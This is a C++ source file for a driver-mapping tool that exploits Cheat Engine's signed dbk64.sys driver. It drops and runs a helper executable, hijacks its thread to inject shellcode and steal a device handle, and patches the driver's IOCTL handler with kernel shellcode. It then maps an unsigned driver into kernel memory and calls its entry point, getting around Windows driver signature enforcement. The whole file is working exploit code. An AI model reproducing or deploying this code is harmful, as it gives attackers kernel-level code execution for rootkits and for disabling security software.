#include "kdmapper_ce.hpp"

PVOID64 kdmapper_ce::pMmGetSystemRoutineAddress = NULL;
PVOID64 kdmapper_ce::pIofCompleteRequest = NULL;

HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {

    HANDLE result = INVALID_HANDLE_VALUE;

    // drop kernelmoduleunloader.exe into the %temp% folder

    std::wstring UnloaderPath = utils::GetFullTempPath() + L"\\" + L"Kernelmoduleunloader.exe";
    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe", kernelmoduleunloader_resource::kernelmoduleunloader, sizeof(kernelmoduleunloader_resource::kernelmoduleunloader));

    // adjust process token

    BOOL bRet = FALSE;
    HANDLE hToken = NULL;
    LUID luid = { 0 };

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        {
            TOKEN_PRIVILEGES tokenPriv = { 0 };
            tokenPriv.PrivilegeCount = 1;
            tokenPriv.Privileges[0].Luid = luid;
            tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
    }
    if (!bRet) {
        Error("RtlAdjustPrivilege failed");
        return result;
    }

    // spawn kernelmoduleunloader.exe process
    // TODO: hide kernelmoduleunloader's popup

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL,
        (LPWSTR)UnloaderPath.c_str(),
        NULL,
        NULL,
        TRUE,          // bInheritHandles: Because shellcode requires SE_PRIVILEGE_ENABLED
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi))
    {
        Error("CreateProcess failed 0x%x", GetLastError());
        return result;
    }

    result = pi.hProcess;
    //CloseHandle(pi.hThread);
    //CloseHandle(pi.hProcess);
    return result;
}

HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {

    // Perform thread hijacking methods on the target process

    HANDLE hDevice = INVALID_HANDLE_VALUE;
    HANDLE threadHijacked = NULL;
    HANDLE targetThread = NULL;
    HANDLE snapshot;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    DWORD targetProcessID = GetProcessId(hTargetProcess);

    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(snapshot, &threadEntry);

    while (Thread32Next(snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == targetProcessID)
        {

#ifdef _DEBUG
            Log("kdmapper-ce.exe processID:%d TargetThreadID:%d", threadEntry.th32OwnerProcessID, threadEntry.th32ThreadID);
#endif // _DEBUG

            targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    if (targetThread == NULL) {
        Error("OpenThread failed");
        return hDevice;
    }

    // inject shellcode

    SIZE_T shellcode_size = sizeof shellcode_resource::shellcode;

    HANDLE remoteShellcodeBuffer = VirtualAllocEx(hTargetProcess, NULL, shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteShellcodeBuffer == NULL) {
        Error("VirtualAllocEx failed");
        return hDevice;
    }

    WriteProcessMemory(hTargetProcess, remoteShellcodeBuffer, shellcode_resource::shellcode, shellcode_size, NULL);

    // hijack the main thread of kernelmoduleunloader

    WOW64_CONTEXT ct32;
    ZeroMemory(&ct32, sizeof(PWOW64_CONTEXT));

    Wow64SuspendThread(targetThread);

    ct32.ContextFlags = CONTEXT_CONTROL;
    Wow64GetThreadContext(targetThread, &ct32);

    ct32.Eip = (DWORD)remoteShellcodeBuffer;

    Wow64SetThreadContext(targetThread, &ct32);
    ResumeThread(targetThread);

    Sleep(1000); // 1s

    // pattern��kernelmoduleunloader�̃v���Z�X���������X�L����

    MEMORY_PATTERN  pattern = { 0x12345678, NULL, 0x12345678 };

    MEMORY_PATTERN* tmp_pattern = (MEMORY_PATTERN*)SearchMemoryForPattern(
        hTargetProcess,
        pattern,
        PAGE_READWRITE,
        MEM_COMMIT,
        MEM_PRIVATE
    );

#ifdef _DEBUG
    //Log("%x, %d, %x", tmp_pattern->marks, tmp_pattern->handle, tmp_pattern->marks2);
#endif // DEBUG

    if (tmp_pattern->marks == 0x12345678 && tmp_pattern->marks2 == 0x12345678) {
        hDevice = (HANDLE)tmp_pattern->handle;
    }

    return hDevice;
}

LPVOID kdmapper_ce::SearchMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN pattern, DWORD flProtect, DWORD flAllocationType, DWORD flType) {

    LPVOID offset = 0;
    LPVOID lpBuffer = NULL;
    MEMORY_BASIC_INFORMATION mbi = {};

    lpBuffer = VirtualAlloc(NULL, sizeof(MEMORY_PATTERN), MEM_COMMIT, PAGE_READWRITE);
    if (lpBuffer == NULL) {
        Error("VirtualAlloc failed");
        return NULL;
    }

#ifdef _DEBUG
    //printf("BaseAddress");
    //printf("\tRegionSize");
    //printf("\tProtect");
    //printf("\tState");
    //printf("\tType\n");
#endif // _DEBUG

    while (VirtualQueryEx(hProcess, offset, &mbi, sizeof(mbi)))
    {

#ifdef _DEBUG
        //printf("0x%llx", mbi.BaseAddress);
        //printf("\t%llx", mbi.RegionSize);
        //printf("\t%lx", mbi.AllocationProtect);
        //printf("\t%lx", mbi.State);
        //printf("\t%lx\n", mbi.Type);
#endif // _DEBUG

        // Compare patterns

        ReadProcessMemory(hProcess, mbi.BaseAddress, lpBuffer, sizeof(MEMORY_PATTERN), NULL);
        SIZE_T res = RtlCompareMemory(lpBuffer, (const void*)&pattern, sizeof(MEMORY_PATTERN));

        if (mbi.AllocationProtect == flProtect && mbi.State == flAllocationType && mbi.Type == flType && res != (SIZE_T)0)
        {
            Log("Pattern found at 0x%x (match pattern count: 0x%d)", mbi.BaseAddress, res);
            break;
        }

        if (mbi.BaseAddress > (PVOID)0x7fffffff)
        {
            Error("Scan error: No pattern found");
            break;
        }

        offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    return lpBuffer;
}


HANDLE kdmapper_ce::GetDbk64DeviceHandle()
{
    HANDLE hDbk64 = INVALID_HANDLE_VALUE;
    HANDLE hKernelModuleUnloader = INVALID_HANDLE_VALUE;

    hKernelModuleUnloader = CreateKernelModuleUnloaderProcess();
    if (hKernelModuleUnloader == INVALID_HANDLE_VALUE) {
        Error("CreateKernelModuleUnloaderProcess failed");
        return hDbk64;
    }

    // drop kernelmoduleunloader.exe.sig into the %temp% folder

    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe.sig", kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig, sizeof(kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig));

    // Inject the shellcode into the KernelModuleUnloader.exe process to get the device handle of dbk64.sys.

    HANDLE hOriginalDbk64 = GetDbk64DeviceHandleByInjection(hKernelModuleUnloader);
    if (hOriginalDbk64 == INVALID_HANDLE_VALUE || hOriginalDbk64 == NULL || hOriginalDbk64 == (HANDLE)0xffffffff) {
        Error("GetDbk64DeviceHandleByInjection failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    // Convert a handle obtained by kernelmoduleunloader into a handle that can be used by kdmapper-ce

    if (!DuplicateHandle(hKernelModuleUnloader, hOriginalDbk64, GetCurrentProcess(), &hDbk64, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
        Error("DuplicateHandle failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    Log("Duplicated Dbk64.sys handle: 0x%d (original: 0x%d)", hDbk64, hOriginalDbk64);

    // Close process and process handles. 

    TerminateProcess(hKernelModuleUnloader, 0);
    CloseHandle(hKernelModuleUnloader);

    return hDbk64;
}


BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS* exitCode)
{

    // Testing the Patched IOCTL routine 
#ifdef _DEBUG
    if (!Dbk64HookedDeviceIoControlTest(dbk64_device_handle, L"MmGetSystemRoutineAddress")) {
        Error("DeviceIoControlTest failed");
        return FALSE;
    }
#endif // _DEBUG

    BOOL status = FALSE;

    do {

      // .sys ファイルをパース

        const PIMAGE_NT_HEADERS64 ntHeaders = portable_executable::GetNtHeaders(hDriver);

        if (!ntHeaders) {
            Error("Invalid format of PE image");
            break;
        }

        if (ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            Error("Image is not 64 bit");
            break;
        }

        Log("Validity of the inputted driver: Valid");

        uint32_t ImageSize = ntHeaders->OptionalHeader.SizeOfImage;

        UINT64 KernelBuf = AllocateNonPagedMem(dbk64_device_handle, ImageSize);
        if (KernelBuf == NULL) {
            Error("AllocateNoPagedMem failed");
            break;
        }

        Log("Kernel memory has been allocatted at 0x%p", KernelBuf);

        // 上で確保したバッファのMDL を作成し，ユーザー空間からアクセス可能にする

        VOID* SharedBuf = NULL;
        UINT64 Mdl = NULL;

        if (!CreateSharedMemory(dbk64_device_handle, KernelBuf, (UINT64*)&SharedBuf, &Mdl, ImageSize)) {
            Error("CreateSharedMemory failed");
            break;
        }

        Log("Shared memory has been created in user space at 0x%p (MDL: 0x%p)", SharedBuf, Mdl);

        // Copy image headers

        memcpy(SharedBuf, (BYTE*)hDriver, ntHeaders->OptionalHeader.SizeOfHeaders);

        // Copy image sections

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
        {
            if ((section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
                continue;
            auto sectionDestination = (LPVOID)((DWORD_PTR)SharedBuf + (DWORD_PTR)section->VirtualAddress);
            auto sectionBytes = (LPVOID)((DWORD_PTR)hDriver + (DWORD_PTR)section->PointerToRawData);
            memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
            Log("Copy section : SectionCount 0x%d 0x%p ", i, sectionDestination);
            section++;
        }

        // Resolve relocs and imports

        DWORD_PTR deltaImageBase = (DWORD_PTR)KernelBuf - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
        portable_executable::RelocateImageByDelta(portable_executable::GetRelocs((VOID*)SharedBuf), deltaImageBase);

        if (!ResolveImports(dbk64_device_handle, portable_executable::GetImports(SharedBuf))) {
            Error("Failed to resolve imports");
            break;
        }

        // unmap shared memory

        if (!UnMapSharedMemory(dbk64_device_handle, (UINT64)SharedBuf, Mdl)) {
            Error("UnMapSharedMemory failed");
            break;
        }

        Log("Successfully removed shared memory from user space...");

        // Call driver entry point

        const uint64_t address_of_entry_point = (uint64_t)KernelBuf + ntHeaders->OptionalHeader.AddressOfEntryPoint;

        //Log("Calling DriverEntry 0x%p", address_of_entry_point);
        //if (!kdmapper_ce::CallDriverEntry(dbk64_device_handle, address_of_entry_point)) {
        //    Error("Failed to call driver entry");
        //    break;
        //}

        Log("Calling DriverEntry 0x%p", address_of_entry_point);
        if (!kdmapper_ce::CreateDriverObject(dbk64_device_handle, address_of_entry_point, L"\\Driver\\TDLD")) {
            Error("CreateDriverObject failed");
            break;
        }

        status = TRUE;

    } while (FALSE);

    return status;
    
}

BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
{

    BOOL bRc = FALSE;
    SIZE_T shellcodeSize = sizeof(kernel_mode_shellcode_resource::kernel_mode_shellcode);
    VOID* shellcode = (VOID*)kernel_mode_shellcode_resource::kernel_mode_shellcode;
    SIZE_T shellcodeIoctlSize = sizeof(kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl);
    VOID* shellcodeIoctl = (VOID*)kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl;
    PVOID64 kernelShellcodeBuf = NULL;
    KernelPisParameters pisParameters = {};
    PVOID64 ioctlShellcodeBuf = NULL;
    PVOID64 kernelParamAddr = NULL;

    do {

        kdmapper_ce::pMmGetSystemRoutineAddress = ce_driver::GetSystemProcAddress(dbk64_device_handle, L"MmGetSystemRoutineAddress");
        kdmapper_ce::pIofCompleteRequest = ce_driver::GetSystemProcAddress(dbk64_device_handle, L"IofCompleteRequest");

        if (kdmapper_ce::pMmGetSystemRoutineAddress < (PVOID64)0x7FFFFFFFFFFF || kdmapper_ce::pIofCompleteRequest < (PVOID64)0x7FFFFFFFFFFF)
            break;

        // Place IRP_MJ_DEVICE_CONTROL patch shellcode in kernel space.

        kernelShellcodeBuf = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, shellcode, shellcodeSize);
        if (kernelShellcodeBuf == nullptr) {
            Error("WriteNonPagedMemory first shellcode failed");
            break;
        }

        // Place hooked ioctl shellcode in kernel space

        ioctlShellcodeBuf = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, shellcodeIoctl, shellcodeIoctlSize);
        if (ioctlShellcodeBuf == nullptr) {
            Error("WriteNonPagedMemory second shellcode failed");
            break;
        }

        // Place PIC arguments in kernel space

        pisParameters.MmGetSystemRoutineAddress = kdmapper_ce::pMmGetSystemRoutineAddress;
        pisParameters.HookFunctionAddress = (LPVOID)ioctlShellcodeBuf;
        pisParameters.dummy = NULL;

        kernelParamAddr = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, &pisParameters, sizeof(KernelPisParameters));
        if (kernelParamAddr == nullptr) {
            Error("WriteNonPagedMemory second shellcode param failed");
            break;
        }

        // Execute kernel mode shellcode

        if (!ce_driver::ExecuteKernelModeShellCode(dbk64_device_handle, (UINT64)kernelShellcodeBuf, (UINT64)kernelParamAddr)) {
            Error("ExecuteKernelModeShellCode failed");
            break;
        }

        bRc = TRUE;

    } while (false);

    return bRc;
}

BOOL kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_imports imports) {
    for (const auto& current_import : imports) {

        /*ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
        if (!Module) {
#if !defined(DISABLE_OUTPUT)
            Log("Dependency %s wasn't found", current_import.module_name);
#endif
            return false;
        }*/
        for (auto& current_function_data : current_import.function_datas) {
            //uint64_t function_address = GetKernelModuleExport(hDevice, Module, current_function_data.name);
            //TODO:
            // ����ntoskrnl�̂ݑΉ�
            std::wstring function_name(current_function_data.name.begin(), current_function_data.name.end());
            uint64_t function_address = (uint64_t)GetSystemProcAddress(hDevice, function_name.c_str());

            //uint64_t function_address = MmGetSystemRoutineAddress(hDevice, current_function_data.name);
            Log("ResolveImports: import %ls (0x%p)", function_name.c_str(), function_address);
            //            if (!function_address) {
            //                //Lets try with ntoskrnl
            //                if (Module != ntoskrnlAddr) {
            //                    function_address = GetKernelModuleExport(hDevice, ntoskrnlAddr, current_function_data.name);
            //                    if (!function_address) {
            //#if !defined(DISABLE_OUTPUT)
            //                        Log("Failed to resolve import %s (%s)", current_function_data.name, current_import.module_name);
            //#endif
                                    //return false;
                               // }
                            //}
                        //}

            * current_function_data.address = function_address;
        }
    }

    return true;
}

PVOID64 kdmapper_ce::WriteNonPagedMemory(HANDLE hDevice, PVOID lpBuffer, SIZE_T nSize) {
    
    UINT64 kernelShellcodeBuf = NULL;
    UINT64 sharedBuf = NULL;
    UINT64 Mdl = NULL;

    kernelShellcodeBuf = ce_driver::AllocateNonPagedMem(hDevice, nSize);
    if (kernelShellcodeBuf == NULL) {
        Error("AllocateNoPagedMem failed");
        return nullptr;
    }

    Log("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);

    // Create an MDL for the buffer allocated above and make it accessible from user space.

    if (!ce_driver::CreateSharedMemory(hDevice, kernelShellcodeBuf, &sharedBuf, &Mdl, nSize)) {
        Error("CreateSharedMemory failed");
        return nullptr;
    }

    Log("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", sharedBuf, Mdl);

    // Write shellcode to shared memory

    memcpy((void*)sharedBuf, lpBuffer, nSize);

    // Unmapping of memory allocated to user space

    if (!ce_driver::UnMapSharedMemory(hDevice, sharedBuf, Mdl)) {
        Error("UnMapSharedMemory failed");
        return nullptr;
    }

    return (PVOID64)kernelShellcodeBuf;
}

PVOID kdmapper_ce::Dbk64HookedDeviceIoControlTest(HANDLE hDevice, PCWSTR functionName) {

    auto ioCtlCode = IOCTL_GETPROCADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 functionName;
    } inp = {
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        (UINT64)functionName
    };


    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    if (bRc)
        return (PVOID)inp.MmGetSystemRoutineAddress;
    else
        return NULL;
}

UINT64 kdmapper_ce::AllocateNonPagedMem(HANDLE hDevice, SIZE_T Size) {

    auto ioCtlCode = IOCTL_ALLOCATEMEM_NONPAGED;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;
    
    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        SIZE_T Size;
    } inp = { 
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        Size 
    };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(input),
        &bytesReturned,
        NULL
    );

    return inp.MmGetSystemRoutineAddress;
}

BOOL kdmapper_ce::CreateSharedMemory(HANDLE hDevice, UINT64 kernelBuf, UINT64* sharedBuf, UINT64* Mdl, SIZE_T bufSize) {

    auto ioCtlCode = IOCTL_MAP_MEMORY;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 TargetPID;
        UINT64 address;
        DWORD size;
    } inp = {
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        GetCurrentProcessId(),
        kernelBuf,
        bufSize
    };

    struct output
    {
        UINT64 MDL;
        UINT64 Address;
    } outp = { 0 };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &outp,
        sizeof(output),
        &bytesReturned,
        NULL
    );

    *sharedBuf = outp.Address;
    *Mdl = outp.MDL;

    return bRc;
}

BOOL kdmapper_ce::UnMapSharedMemory(HANDLE hDevice, UINT64 sharedMemAddress, UINT64 Mdl) {

    auto ioCtlCode = IOCTL_UNMAP_MEMORY;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 MDL;
        UINT64 Address;
    } inp = { 
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        Mdl,
        sharedMemAddress
    };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return bRc;
}


PVOID kdmapper_ce::GetSystemProcAddress(HANDLE hDevice, PCWSTR functionName) {
    auto ioCtlCode = IOCTL_GETPROCADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 functionName;
    } inp = {
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        (UINT64)functionName
    };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    if (bRc)
        return (PVOID)inp.MmGetSystemRoutineAddress;
    else
        return FALSE;
}

BOOL kdmapper_ce::CreateDriverObject(HANDLE hDevice, UINT64 EntryPoint, PCWSTR driverName) {

    auto ioCtlCode = IOCTL_CREATE_DRIVER;
    DWORD returned;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 DriverInitialize;
        UINT64 driverName;
    } inp = {
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        EntryPoint,
        (UINT64)driverName
    };

    if (DeviceIoControl(hDevice, ioCtlCode, &inp, sizeof input, nullptr, 0, &returned, nullptr))
        return TRUE;
    else
        return FALSE;

}